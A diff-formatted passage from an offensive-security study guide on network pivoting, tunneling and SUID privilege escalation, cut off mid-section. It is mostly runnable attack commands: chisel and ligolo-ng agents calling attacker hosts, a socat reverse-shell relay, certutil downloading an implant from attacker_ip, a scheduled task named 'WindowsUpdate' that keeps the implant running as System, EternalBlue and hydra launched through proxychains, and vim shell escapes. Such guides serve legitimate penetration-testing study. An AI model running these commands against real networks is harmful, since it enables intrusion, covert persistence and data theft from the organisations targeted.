+./chisel client attacker-ip:8000 L:8080:internal-web:80
+
+# Access forwarded service: http://localhost:8080
+```
+
+**SOCKS proxy mode:**
+
+```bash
+# Server on attacker
+./chisel server -p 8000 --reverse
+
+# Client creates SOCKS proxy on server
+./chisel client attacker-ip:8000 R:socks
+
+# Configure proxychains to use attacker-ip:1080
+proxychains nmap -sT 10.10.10.0/24
+```
+
+**Reverse SOCKS proxy:**
+
+```bash
+# Client on compromised host
+./chisel client attacker-ip:8000 R:1080:socks
+
+# On attacker, configure proxy to 127.0.0.1:1080
+# Routes through compromised host's network
+```
+
+### Ligolo-ng - Advanced Pivoting
+
+Ligolo-ng creates layer 3 network tunnels enabling full subnet routing.
+
+**Setup on attacker machine:**
+
+```bash
+# Download from: https://github.com/nicocha30/ligolo-ng/releases
+
+# Start proxy
+./proxy -selfcert
+
+# Add route to internal network (after agent connects)
+sudo ip route add 172.16.0.0/24 dev ligolo
+
+# Start tunnel
+session
+start
+```
+
+**Agent on compromised host:**
+
+```bash
+# Windows
+.\agent.exe -connect attacker-ip:11601 -ignore-cert
+
+# Linux
+./agent -connect attacker-ip:11601 -ignore-cert
+
+# Verify connection on proxy side
+```
+
+**Accessing internal network:**
+
+```bash
+# After tunnel established and route added
+nmap -sV 172.16.0.0/24
+crackmapexec smb 172.16.0.0/24 -u admin -p password
+```
+
+### Windows Port Forwarding (netsh)
+
+**Port forwarding on Windows:**
+
+```cmd
+# Forward local port to remote destination
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=internal-host
+
+# View current forwards
+netsh interface portproxy show all
+
+# Delete specific forward
+netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
+
+# Reset all forwards
+netsh interface portproxy reset
+```
+
+**IPv4 to IPv6 forwarding:**
+
+```cmd
+netsh interface portproxy add v4tov6 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=::1
+```
+
+**Firewall rule requirement:**
+
+```cmd
+netsh advfirewall firewall add rule name="Port Forward 8080" protocol=TCP dir=in localport=8080 action=allow
+```
+
+### SSH.NET for PowerShell Port Forwarding
+
+**Using Posh-SSH module:**
+
+```powershell
+# Install module
+Install-Module -Name Posh-SSH
+
+# Create SSH session with local forward
+New-SSHSession -ComputerName ssh-server -Credential $cred
+New-SSHLocalPortForward -BoundHost localhost -BoundPort 8080 -RemoteAddress internal-web -RemotePort 80 -SSHSession $session
+
+# Access: http://localhost:8080
+```
+
+### ICMP Tunneling (Specialized)
+
+**Using ptunnel-ng:**
+
+```bash
+# On intermediate host (pivot)
+ptunnel-ng -p proxy-host
+
+# On attacker
+ptunnel-ng -p pivot-host -lp 8000 -da target-host -dp 80
+
+# Access: http://localhost:8000
+```
+
+### DNS Tunneling
+
+**Using dnscat2:**
+
+```bash
+# Server (on attacker with authoritative DNS)
+dnscat2-server domain.com
+
+# Client (on compromised host)
+./dnscat domain.com
+
+# Create tunnel session
+session -i 1
+listen 127.0.0.1:8080 target-host:80
+```
+
+**Using iodine:**
+
+```bash
+# Server
+iodined -f -c -P password 10.0.0.1 tunnel.domain.com
+
+# Client
+iodine -f -P password tunnel.domain.com
+
+# Creates tunnel interface, add routes as needed
+```
+
+### Metasploit Port Forwarding
+
+**Local port forward:**
+
+```bash
+meterpreter > portfwd add -l 8080 -p 80 -r internal-host
+meterpreter > portfwd list
+meterpreter > portfwd delete -l 8080
+
+# Access forwarded port: http://localhost:8080
+```
+
+**Reverse port forward:**
+
+```bash
+meterpreter > portfwd add -R -l 4444 -p 4444 -L attacker-ip
+# Target connects to localhost:4444, reaches attacker
+```
+
+**Automatic routing:**
+
+```bash
+meterpreter > run autoroute -s 172.16.0.0/24
+meterpreter > run autoroute -p
+
+# Use auxiliary modules to scan through meterpreter session
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 172.16.0.0/24
+set SESSION 1
+run
+```
+
+### Detection Considerations
+
+**Identifying tunneling activity [Inference - based on common network forensic patterns]:**
+
+```powershell
+# Monitor for unusual SSH connections
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | 
+    Where-Object {$_.Message -match 'ssh'}
+
+# Check for listening ports (potential port forwards)
+netstat -ano | findstr LISTENING
+
+# Monitor outbound connections on unusual ports
+netstat -ano | findstr ESTABLISHED
+```
+
+---
+
+## Important Related Topics
+
+**Critical lateral movement techniques to study next:**
+
+- **WMI and CIM Execution** (WMI command execution, event subscriptions)
+- **WinRM Remote Management** (PowerShell Remoting, Evil-WinRM)
+- **RDP Session Hijacking** (tscon.exe lateral movement)
+- **Pass-the-Hash/Pass-the-Ticket** (credential reuse techniques)
+- **NTLM Relay Attacks** (SMB relay, HTTP to SMB relay)
+
+---
+
+## Pivoting Techniques
+
+### Network Architecture Understanding
+
+**Identify network segments from compromised host:**
+
+```bash
+# View network interfaces
+ip addr
+ifconfig
+ip link show
+
+# View routing table
+ip route
+route -n
+netstat -rn
+
+# Identify connected networks
+ip neigh
+arp -a
+```
+
+**Scan internal networks:**
+
+```bash
+# Using compromised host as scanner
+for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "64 bytes"; done
+
+# Port scanning via bash
+for port in {20..25} {80..90} {443..445}; do
+  timeout 1 bash -c "</dev/tcp/192.168.1.10/$port" 2>/dev/null && echo "Port $port open"
+done
+```
+
+**Static binary scanning tools:**
+
+```bash
+# Transfer nmap static binary
+wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
+chmod +x nmap
+./nmap -p- 192.168.1.0/24
+
+# Transfer netcat static binary
+nc -zv 192.168.1.10 1-1000
+```
+
+### SSH Tunneling Fundamentals
+
+**Local Port Forwarding (-L):**
+
+Forward local port to remote destination through SSH server:
+
+```bash
+# Syntax: ssh -L local_port:destination:destination_port user@ssh_server
+ssh -L 8080:internal_server:80 user@pivot_host
+
+# Access internal_server:80 via localhost:8080
+curl http://localhost:8080
+
+# Multiple port forwards
+ssh -L 8080:192.168.1.10:80 -L 3306:192.168.1.20:3306 user@pivot_host
+```
+
+**Remote Port Forwarding (-R):**
+
+Expose attacker service to compromised network:
+
+```bash
+# Syntax: ssh -R remote_port:localhost:local_port user@remote_host
+# On compromised host
+ssh -R 8080:localhost:80 attacker@attacker_ip
+
+# Now pivot_host:8080 forwards to attacker:80
+```
+
+**Dynamic Port Forwarding (-D) - SOCKS Proxy:**
+
+Creates SOCKS5 proxy for dynamic routing:
+
+```bash
+# Establish SOCKS proxy on local port 1080
+ssh -D 1080 user@pivot_host
+
+# Configure applications to use SOCKS5 proxy localhost:1080
+# Or use with proxychains (covered in next section)
+```
+
+**SSH Tunneling Options:**
+
+```bash
+# Background execution
+ssh -f -N -D 1080 user@pivot_host
+# -f: background
+# -N: no command execution
+# -D: dynamic forwarding
+
+# Compression for slow links
+ssh -C -D 1080 user@pivot_host
+
+# Keep-alive to prevent timeout
+ssh -o ServerAliveInterval=60 -D 1080 user@pivot_host
+
+# Disable strict host key checking (lab environments only)
+ssh -o StrictHostKeyChecking=no -D 1080 user@pivot_host
+```
+
+**SSH Tunneling Through Multiple Hops:**
+
+```bash
+# Jump through intermediate host
+ssh -J user@jump_host user@final_destination
+
+# ProxyJump with port forwarding
+ssh -J user@pivot1,user@pivot2 -L 8080:target:80 user@final_host
+
+# Using ProxyCommand
+ssh -o ProxyCommand="ssh -W %h:%p user@jump_host" user@final_destination
+```
+
+### SSH Key-Based Authentication Setup
+
+**Generate SSH keys on pivot:**
+
+```bash
+ssh-keygen -t rsa -b 4096 -f /tmp/pivot_key -N ""
+cat /tmp/pivot_key.pub >> ~/.ssh/authorized_keys
+# Download private key to attacker machine
+```
+
+**Use private key for tunneling:**
+
+```bash
+ssh -i pivot_key -D 1080 user@pivot_host
+```
+
+### Port Forwarding with Netcat
+
+**Simple port forwarding (relay):**
+
+```bash
+# On pivot host - forward port 8080 to internal_host:80
+mknod backpipe p
+nc -l -p 8080 0<backpipe | nc internal_host 80 1>backpipe
+
+# Alternative using named pipes
+mkfifo /tmp/pipe
+nc -l -p 8080 < /tmp/pipe | nc internal_host 80 > /tmp/pipe
+```
+
+### Metasploit Pivoting
+
+**Add route through Meterpreter session:**
+
+```bash
+# In meterpreter session
+run autoroute -s 192.168.1.0/24
+
+# Or from msf console
+route add 192.168.1.0 255.255.255.0 session_id
+route print
+
+# Background session and use auxiliary modules
+background
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.0/24
+set PORTS 80,443,445,3389
+run
+```
+
+**Meterpreter port forwarding:**
+
+```bash
+# Local port forward
+portfwd add -l 3389 -p 3389 -r 192.168.1.10
+
+# List forwards
+portfwd list
+
+# Delete forward
+portfwd delete -l 3389
+
+# RDP through forward
+rdesktop localhost:3389
+```
+
+**SOCKS proxy via Metasploit:**
+
+```bash
+# Start SOCKS proxy on session
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set SRVPORT 1080
+set VERSION 5
+run -j
+
+# Add route
+route add 192.168.1.0 255.255.255.0 session_id
+
+# Configure proxychains to use 127.0.0.1:1080
+```
+
+### Socat Pivoting
+
+**Port forwarding:**
+
+```bash
+# Forward local 8080 to remote 192.168.1.10:80
+socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80
+
+# Encrypted forwarding with SSL
+socat OPENSSL-LISTEN:443,cert=/path/cert.pem,fork TCP:192.168.1.10:80
+```
+
+**Reverse shell relay:**
+
+```bash
+# On pivot host - relay shells from internal network to attacker
+socat TCP-LISTEN:4444,fork TCP:attacker_ip:5555
+
+# Internal hosts connect to pivot:4444
+# Attacker receives on 5555
+```
+
+---
+
+## ProxyChains Configuration
+
+### Installation and Setup
+
+**Install ProxyChains:**
+
+```bash
+apt-get install proxychains4
+# or
+apt-get install proxychains-ng
+```
+
+**Configuration file location:**
+
+```bash
+/etc/proxychains.conf
+# or user-specific
+~/.proxychains/proxychains.conf
+```
+
+### Configuration File Structure
+
+**Basic SOCKS5 configuration:**
+
+```bash
+cat > /etc/proxychains4.conf << EOF
+strict_chain
+proxy_dns
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+
+[ProxyList]
+socks5 127.0.0.1 1080
+EOF
+```
+
+**Configuration options explained:**
+
+```bash
+# Chain types (choose one)
+strict_chain      # All proxies must work; fails if any proxy down
+dynamic_chain     # Skips dead proxies automatically
+random_chain      # Randomizes proxy order
+# chain_len = 2   # Used with random_chain
+
+# DNS settings
+proxy_dns         # DNS requests through proxy (prevents DNS leaks)
+
+# Timeouts (milliseconds)
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+
+# Quiet mode (suppress output)
+quiet_mode
+```
+
+**Multiple proxy chain:**
+
+```bash
+[ProxyList]
+socks5 127.0.0.1 1080
+socks4 192.168.1.50 1080
+http 10.10.10.10 8080
+```
+
+**Authentication support:**
+
+```bash
+[ProxyList]
+socks5 127.0.0.1 1080 username password
+http 10.10.10.10 8080 user pass
+```
+
+### ProxyChains Usage
+
+**Basic command execution:**
+
+```bash
+proxychains4 nmap -sT -Pn 192.168.1.10
+proxychains4 curl http://192.168.1.10
+proxychains4 firefox
+```
+
+**Port scanning through proxy:**
+
+```bash
+# TCP connect scan (SYN scan won't work through SOCKS)
+proxychains4 nmap -sT -Pn -p- 192.168.1.10
+
+# Service detection
+proxychains4 nmap -sT -Pn -sV -p 80,443,445 192.168.1.0/24
+
+# NSE scripts through proxy
+proxychains4 nmap -sT -Pn --script=vuln 192.168.1.10
+```
+
+**Exploitation through proxy:**
+
+```bash
+# Metasploit modules
+proxychains4 msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.10
+set PROXIES socks5:127.0.0.1:1080
+exploit
+
+# Hydra brute force
+proxychains4 hydra -L users.txt -P pass.txt ssh://192.168.1.10
+
+# SQLmap
+proxychains4 sqlmap -u "http://192.168.1.10/page?id=1"
+```
+
+**Web browser through proxy:**
+
+```bash
+proxychains4 firefox &
+# Access internal web applications
+```
+
+### ProxyChains Limitations
+
+[Inference] - Based on ProxyChains architecture:
+
+- Does not work with ICMP (ping), requires TCP connections
+- UDP support limited; proxychains-ng has better UDP handling
+- SYN scans (-sS) fail; use TCP connect scans (-sT)
+- Some applications detect and refuse proxy usage
+- DNS leaks possible if `proxy_dns` not enabled
+
+### ProxyChains-NG Advantages
+
+**Enhanced version features:**
+
+```bash
+# Install proxychains-ng
+git clone https://github.com/rofl0r/proxychains-ng.git
+cd proxychains-ng
+./configure --prefix=/usr --sysconfdir=/etc
+make
+sudo make install
+sudo make install-config
+```
+
+**Improved functionality:**
+
+- Better UDP support
+- IPv6 support
+- Performance improvements
+- More stable chain handling
+
+---
+
+## Chisel Tunneling
+
+### Overview
+
+Chisel creates TCP/UDP tunnels over HTTP secured via SSH. Written in Go, provides single-binary deployment with built-in SOCKS5 proxy and port forwarding.
+
+### Installation
+
+**Download precompiled binaries:**
+
+```bash
+# Latest release
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+gunzip chisel_1.9.1_linux_amd64.gz
+chmod +x chisel_1.9.1_linux_amd64
+mv chisel_1.9.1_linux_amd64 chisel
+
+# For target architecture
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_386.gz
+```
+
+**Compile from source:**
+
+```bash
+git clone https://github.com/jpillora/chisel.git
+cd chisel
+go build -ldflags="-s -w"
+```
+
+### Chisel Server Setup
+
+**Start server on attacker machine:**
+
+```bash
+# Basic server with SOCKS5
+chisel server -p 8000 --socks5
+
+# Server with authentication
+chisel server -p 8000 --auth user:password --socks5
+
+# Reverse port forwarding server
+chisel server -p 8000 --reverse
+
+# Combined options
+chisel server -p 8000 --reverse --auth user:pass --socks5
+
+# Verbose mode
+chisel server -p 8000 --reverse -v
+```
+
+**Server options:**
+
+```bash
+--host <host>      # Listen host (default 0.0.0.0)
+-p, --port <port>  # Listen port (default 8080)
+--key <key>        # Seed key for deterministic generation
+--auth <user:pass> # Authentication credentials
+--keepalive <dur>  # Keep-alive interval (default 25s)
+--backend <url>    # Backend proxy URL
+--socks5           # Enable built-in SOCKS5 proxy
+--reverse          # Allow reverse tunnels
+-v                 # Verbose logging
+```
+
+### Chisel Client - Forward Tunneling
+
+**Connect to server:**
+
+```bash
+# On compromised host
+chisel client attacker_ip:8000 socks
+# Creates SOCKS5 proxy on localhost:1080
+```
+
+**Specify local SOCKS port:**
+
+```bash
+chisel client attacker_ip:8000 1080:socks
+# SOCKS5 on localhost:1080
+```
+
+**Local port forwarding:**
+
+```bash
+# Forward local 8080 to remote 192.168.1.10:80
+chisel client attacker_ip:8000 8080:192.168.1.10:80
+
+# Multiple forwards
+chisel client attacker_ip:8000 8080:192.168.1.10:80 3389:192.168.1.20:3389
+```
+
+**Combined SOCKS and port forwarding:**
+
+```bash
+chisel client attacker_ip:8000 socks 8080:192.168.1.10:80
+```
+
+**Client with authentication:**
+
+```bash
+chisel client --auth user:password attacker_ip:8000 socks
+```
+
+### Chisel Client - Reverse Tunneling
+
+Useful when attacker cannot reach compromised host directly (firewall/NAT).
+
+**Reverse SOCKS proxy:**
+
+```bash
+# On compromised host
+chisel client attacker_ip:8000 R:socks
+
+# On attacker machine - SOCKS5 now available on server's localhost:1080
+proxychains4 nmap -sT 192.168.1.10
+```
+
+**Reverse port forwarding:**
+
+```bash
+# Expose compromised host's port 3306 to attacker's 3306
+chisel client attacker_ip:8000 R:3306:localhost:3306
+
+# Expose internal network service to attacker
+chisel client attacker_ip:8000 R:8080:192.168.1.10:80
+
+# On attacker machine - access via localhost:8080
+curl http://localhost:8080
+```
+
+**Reverse SOCKS with custom port:**
+
+```bash
+# On compromised host
+chisel client attacker_ip:8000 R:9050:socks
+
+# On attacker - configure proxychains to use localhost:9050
+```
+
+### Chisel Usage Patterns
+
+**Pattern 1: Basic SOCKS pivot:**
+
+```bash
+# Attacker (10.10.14.5)
+chisel server -p 8000 --socks5
+
+# Compromised host (10.10.10.50) with access to 192.168.1.0/24
+chisel client 10.10.14.5:8000 socks
+
+# Attacker usage
+proxychains4 nmap -sT 192.168.1.10
+```
+
+**Pattern 2: Reverse SOCKS (firewall bypass):**
+
+```bash
+# Attacker (public IP)
+chisel server -p 8000 --reverse
+
+# Compromised host (behind NAT/firewall)
+chisel client attacker_ip:8000 R:socks
+
+# Attacker usage - target internal networks
+proxychains4 curl http://192.168.1.10
+```
+
+**Pattern 3: Double pivot:**
+
+```bash
+# Attacker
+chisel server -p 8000 --reverse
+
+# Pivot 1 (DMZ host)
+chisel client attacker_ip:8000 R:9001:socks &
+chisel server -p 9001 --socks5
+
+# Pivot 2 (internal network)
+chisel client pivot1_ip:9001 socks
+
+# Attacker can now reach networks behind Pivot 2
+proxychains4 nmap -sT 172.16.1.0/24
+```
+
+**Pattern 4: Windows target:**
+
+```bash
+# Transfer chisel_windows_amd64.exe to target
+# On attacker
+chisel server -p 8000 --reverse
+
+# On Windows target (PowerShell)
+.\chisel.exe client attacker_ip:8000 R:socks
+```
+
+### Chisel Performance Optimization
+
+```bash
+# Increase keep-alive for unstable connections
+chisel server -p 8000 --keepalive 10s --reverse
+
+# Client-side keep-alive
+chisel client --keepalive 10s attacker_ip:8000 R:socks
+
+# Use specific fingerprint for security
+chisel server -p 8000 --key "your-secret-key" --reverse
+chisel client --fingerprint <fp> attacker_ip:8000 R:socks
+```
+
+### Chisel with Authentication
+
+**Server with user:pass:**
+
+```bash
+chisel server -p 8000 --auth user:SecureP@ss123 --reverse
+```
+
+**Client authentication:**
+
+```bash
+chisel client --auth user:SecureP@ss123 attacker_ip:8000 R:socks
+```
+
+### Chisel Debugging
+
+```bash
+# Verbose server
+chisel server -p 8000 --reverse -v
+
+# Verbose client
+chisel client -v attacker_ip:8000 R:socks
+
+# Check connections
+ss -tulpn | grep chisel
+netstat -antup | grep chisel
+```
+
+---
+
+## Ligolo-ng Tunneling
+
+### Overview
+
+Ligolo-ng (next generation) provides advanced tunneling with TUN interface support, enabling transparent network layer pivoting. More powerful than traditional SOCKS proxies.
+
+### Installation
+
+**Download precompiled releases:**
+
+```bash
+# Attacker (proxy)
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz
+tar xvf ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz
+chmod +x proxy
+
+# Target (agent)
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz
+tar xvf ligolo-ng_agent_0.5.2_linux_amd64.tar.gz
+chmod +x agent
+```
+
+**Available agent variants:**
+
+```bash
+# Windows
+ligolo-ng_agent_0.5.2_windows_amd64.zip
+
+# Linux ARM
+ligolo-ng_agent_0.5.2_linux_arm64.tar.gz
+
+# macOS
+ligolo-ng_agent_0.5.2_darwin_amd64.tar.gz
+```
+
+**Compile from source:**
+
+```bash
+git clone https://github.com/nicocha30/ligolo-ng.git
+cd ligolo-ng
+
+# Build proxy
+go build -o proxy cmd/proxy/main.go
+
+# Build agent
+go build -o agent cmd/agent/main.go
+
+# Build with custom features
+GOOS=windows GOARCH=amd64 go build -o agent.exe cmd/agent/main.go
+```
+
+### TUN Interface Setup (Linux Attacker)
+
+**Create TUN interface:**
+
+```bash
+# Install required packages
+sudo apt-get install iproute2
+
+# Create TUN interface
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+
+# Verify interface created
+ip addr show ligolo
+```
+
+**Cleanup TUN interface:**
+
+```bash
+sudo ip link delete ligolo
+```
+
+### TUN Interface Setup (Windows Attacker)
+
+**Install Wintun driver:**
+
+```powershell
+# Download from https://www.wintun.net/
+# Extract wintun.dll to same directory as proxy.exe
+
+# Run proxy with admin privileges
+.\proxy.exe -selfcert
+```
+
+### Ligolo-ng Proxy (Server) Setup
+
+**Generate self-signed certificate:**
+
+```bash
+# Proxy generates certificate automatically
+./proxy -selfcert
+
+# Or generate manually
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+./proxy -certfile cert.pem -keyfile key.pem
+```
+
+**Start proxy:**
+
+```bash
+# With self-signed cert
+sudo ./proxy -selfcert
+
+# With custom certificate
+sudo ./proxy -certfile cert.pem -keyfile key.pem
+
+# Specify listen address and port
+sudo ./proxy -selfcert -laddr 0.0.0.0:11601
+
+# Enable autocert (Let's Encrypt)
+sudo ./proxy -autocert
+```
+
+**Proxy options:**
+
+```bash
+-laddr <ip:port>         # Listen address (default 0.0.0.0:11601)
+-selfcert                # Use self-signed certificate
+-certfile <path>         # TLS certificate file
+-keyfile <path>          # TLS key file
+-autocert                # Use Let's Encrypt
+-autocert-domain <dom>   # Domain for autocert
+-api                     # Enable REST API
+-api-addr <ip:port>      # API listen address
+-v                       # Verbose mode
+```
+
+### Ligolo-ng Agent (Client) Setup
+
+**Connect agent to proxy:**
+
+```bash
+# Basic connection
+./agent -connect attacker_ip:11601
+
+# Accept self-signed certificate (for testing)
+./agent -connect attacker_ip:11601 -ignore-cert
+
+# Specify retry parameters
+./agent -connect attacker_ip:11601 -retry
+
+# Background agent (Linux)
+nohup ./agent -connect attacker_ip:11601 -ignore-cert &
+```
+
+**Agent options:**
+
+```bash
+-connect <ip:port>       # Proxy address
+-ignore-cert             # Accept invalid certificates
+-retry                   # Auto-retry on connection failure
+-bind <ip:port>          # Local bind address
+-interface <name>        # Network interface to use
+-socks <ip:port>         # SOCKS5 proxy for outbound
+-v                       # Verbose mode
+```
+
+### Ligolo-ng Proxy Interface Usage
+
+**List connected agents:**
+
+```bash
+ligolo-ng » session
+# Shows all connected agents with IDs
+```
+
+**Select active session:**
+
+```bash
+ligolo-ng » session
+? Specify a session: <agent_id>
+
+# Example
+ligolo-ng » session
+? Specify a session: 1
+```
+
+**Display agent network information:**
+
+```bash
+[Agent : user@hostname] » ifconfig
+# Shows all network interfaces on compromised host
+```
+
+**Add routes to internal networks:**
+
+```bash
+# After selecting session and viewing ifconfig
+# Add route on attacker machine (in separate terminal)
+sudo ip route add 192.168.1.0/24 dev ligolo
+
+# Verify route
+ip route show | grep ligolo
+```
+
+**Start tunnel:**
+
+```bash
+[Agent : user@hostname] » start
+# Tunnel is now active
+```
+
+**Stop tunnel:**
+
+```bash
+[Agent : user@hostname] » stop
+```
+
+**Add listener (port forwarding):**
+
+```bash
+# Syntax: listener_add --addr <attacker_ip:port> --to <target_ip:port>
+
+# Forward attacker port 1234 to target's localhost:3306
+[Agent : user@hostname] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:3306
+
+# Forward to internal host
+[Agent : user@hostname] » listener_add --addr 0.0.0.0:8080 --to 192.168.1.10:80
+```
+
+**List listeners:**
+
+```bash
+[Agent : user@hostname] » listener_list
+```
+
+**Remove listener:**
+
+```bash
+[Agent : user@hostname] » listener_remove <listener_id>
+```
+
+### Ligolo-ng Pivoting Workflow
+
+**Complete workflow example:**
+
+```bash
+# Step 1: Attacker setup TUN interface
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+
+# Step 2: Start proxy
+sudo ./proxy -selfcert
+
+# Step 3: On compromised host, start agent
+./agent -connect attacker_ip:11601 -ignore-cert
+
+# Step 4: In proxy interface, select session
+ligolo-ng » session
+? Specify a session: 1
+
+# Step 5: View agent networks
+[Agent : user@hostname] » ifconfig
+# Shows networks like:
+# ┌──────────────────────────────────────────┐
+# │ Interface 0                              │
+# ├──────────────────────────────────────────┤
+# │ Name    : eth0                           │
+# │ Address : 192.168.1.50/24                │
+# └──────────────────────────────────────────┘
+
+# Step 6: Add route on attacker (new terminal)
+sudo ip route add 192.168.1.0/24 dev ligolo
+
+# Step 7: Start tunnel
+[Agent : user@hostname] » start
+
+# Step 8: Direct access to internal network (no proxychains needed)
+nmap -sS 192.168.1.10
+curl http://192.168.1.20
+rdesktop 192.168.1.30
+```
+
+### Double Pivoting with Ligolo-ng
+
+**Scenario: Attacker → DMZ Host → Internal Network**
+
+```bash
+# Network topology:
+# Attacker (10.10.14.5) → DMZ (10.10.10.50, 192.168.1.50) → Internal (192.168.1.0/24, 172.16.0.0/16)
+
+# Step 1: First pivot (Attacker → DMZ)
+# On attacker
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+sudo ./proxy -selfcert
+
+# On DMZ host
+./agent -connect 10.10.14.5:11601 -ignore-cert
+
+# In proxy
+ligolo-ng » session
+? Specify a session: 1
+[Agent : dmz@host] » ifconfig
+[Agent : dmz@host] » start
+
+# On attacker (new terminal)
+sudo ip route add 192.168.1.0/24 dev ligolo
+
+# Step 2: Second pivot (DMZ → Internal)
+# Setup second proxy on DMZ host
+./proxy -selfcert -laddr 192.168.1.50:11602
+
+# Create second TUN interface on DMZ
+sudo ip tuntap add user $(whoami) mode tun ligolo2
+sudo ip link set ligolo2 up
+
+# On internal host (if accessible from DMZ)
+./agent -connect 192.168.1.50:11602 -ignore-cert
+
+# In second proxy on DMZ
+ligolo-ng » session
+? Specify a session: 1
+[Agent : internal@host] » ifconfig
+[Agent : internal@host] » start
+
+# On DMZ host
+sudo ip route add 172.16.0.0/16 dev ligolo2
+
+# On attacker - route 172.16.0.0/16 through DMZ
+sudo ip route add 172.16.0.0/16 via 192.168.1.50
+```
+
+### Ligolo-ng Port Forwarding
+
+**Local port forwarding:**
+
+```bash
+# Access internal service on attacker machine
+[Agent : user@hostname] » listener_add --addr 0.0.0.0:3389 --to 192.168.1.10:3389
+
+# On attacker
+rdesktop localhost:3389
+```
+
+**Remote port forwarding (reverse):**
+
+```bash
+# Expose attacker service to internal network
+[Agent : user@hostname] » listener_add --addr 192.168.1.50:8080 --to 127.0.0.1:8080
+
+# Internal hosts can access attacker's localhost:8080 via 192.168.1.50:8080
+```
+
+### Ligolo-ng vs Chisel Comparison
+
+[Inference] - Based on tool design and capabilities:
+
+**Ligolo-ng advantages:**
+
+- TUN interface provides true Layer 3 connectivity
+- No need for proxychains - direct tool usage
+- Full protocol support (ICMP, UDP, TCP)
+- Better performance for large data transfers
+- Simpler routing configuration
+
+**Chisel advantages:**
+
+- Single binary, simpler deployment
+- Works without TUN interface setup
+- HTTP-based transport may bypass some firewalls
+- Built-in authentication
+- Easier for quick SOCKS proxy setup
+
+**Use Ligolo-ng when:**
+
+- Need full network layer access
+- Performing comprehensive network scanning
+- Require ICMP/UDP protocols
+- Multi-hop pivoting scenarios
+- Performance critical operations
+
+**Use Chisel when:**
+
+- Quick SOCKS proxy needed
+- No root/admin access for TUN interface
+- HTTP-based tunneling preferred
+- Simpler deployment requirements
+
+### Windows Agent Execution
+
+**Transfer and execute:**
+
+```powershell
+# Transfer via HTTP
+certutil -urlcache -f http://attacker_ip/agent.exe C:\Windows\Temp\agent.exe
+
+# Execute
+C:\Windows\Temp\agent.exe -connect attacker_ip:11601 -ignore-cert
+
+# Background execution
+Start-Process -NoNewWindow -FilePath "C:\Windows\Temp\agent.exe" -ArgumentList "-connect attacker_ip:11601 -ignore-cert"
+```
+
+**Create scheduled task for persistence:**
+
+```powershell
+schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\agent.exe -connect attacker_ip:11601 -ignore-cert" /sc onstart /ru System
+```
+
+### Ligolo-ng Troubleshooting
+
+**Check TUN interface:**
+
+```bash
+ip addr show ligolo
+# Should show UP state
+```
+
+**Verify routing:**
+
+```bash
+ip route show | grep ligolo
+# Should show routes through ligolo interface
+```
+
+**Test connectivity:**
+
+```bash
+# Ping through tunnel
+ping -c 1 192.168.1.1
+
+# Verify with tcpdump
+sudo tcpdump -i ligolo
+```
+
+**Common issues:**
+
+[Inference] - Based on typical deployment scenarios:
+
+- **Agent won't connect**: Check firewall rules, certificate issues
+- **Routing not working**: Verify TUN interface is UP, routes are added
+- **Connection drops**: Increase keepalive, check network stability
+- **Permission denied**: Proxy requires root for TUN interface creation
+
+---
+
+## Related Critical Topics
+
+For comprehensive lateral movement methodology, also investigate:
+
+- **Post-Exploitation Frameworks** - Empire, Covenant, Cobalt Strike for advanced pivoting and C2 channels
+- **DNS Tunneling** - dnscat2, iodine for exfiltration and pivoting over DNS protocol
+- **ICMP Tunneling** - ptunnel, icmpsh for firewall bypass scenarios
+- **SMB/Named Pipe Pivoting** - Windows-specific lateral movement through SMB C$ shares and administrative protocols
+- **Container Network Pivoting** - Docker, Kubernetes network escape and cross-container access techniques
+
+---
+
+# Privilege Escalation Vectors
+
+## SUID/SGID Binary Exploitation
+
+### Concept Overview
+
+SUID (Set User ID) and SGID (Set Group ID) bits allow binaries to execute with the permissions of their owner rather than the executing user. Misconfigured SUID/SGID binaries owned by root become direct privilege escalation vectors.
+
+### Enumeration Techniques
+
+**Find all SUID binaries:**
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+```
+
+**Find all SGID binaries:**
+
+```bash
+find / -perm -g=s -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+```
+
+**Combined SUID/SGID search with detailed output:**
+
+```bash
+find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null
+```
+
+**Filter for interesting binaries:**
+
+```bash
+find / -perm -u=s -type f 2>/dev/null | grep -v "/snap/" | grep -v "/proc/"
+```
+
+### Common Exploitable SUID Binaries
+
+**GTFOBins-Listed Binaries:**
+
+These standard utilities allow privilege escalation when SUID-enabled:
+
+**nmap (legacy versions with interactive mode):**
+
+```bash
+nmap --interactive
+!sh
+```
+
+**vim/vi:**
+
+```bash
+vim -c ':!/bin/sh'
+# or
+vim
+:set shell=/bin/sh
+:shell
+```
+
+**find:**
+
+```bash
